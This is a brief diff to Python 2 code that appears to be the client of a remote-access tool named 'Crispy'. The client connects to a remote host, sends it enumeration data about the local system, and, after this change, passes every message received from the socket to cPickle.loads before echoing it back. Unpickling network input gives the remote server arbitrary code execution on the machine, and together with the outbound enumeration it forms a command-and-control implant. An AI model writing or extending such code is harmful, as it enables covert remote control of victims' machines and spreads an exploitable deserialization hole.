@@ -1,3 +1,4 @@
+import cPickle
 import datetime
 import json
 import os
@@ -86,11 +87,9 @@ def main():
 	sock = CrispyTCPClient().connect(host, port)
 	print "[+] Connected successfully"
 	sock.send(json.dumps(enum()))
-	data = ""
 	while True:
-	    data = sock.recv(1024)
-            if data == "byebye":
-                break
+	    data = cPickle.loads(sock.recv(1024))
+            sock.send(data)
     except KeyboardInterrupt: 
 	pass
     except Exception as e:
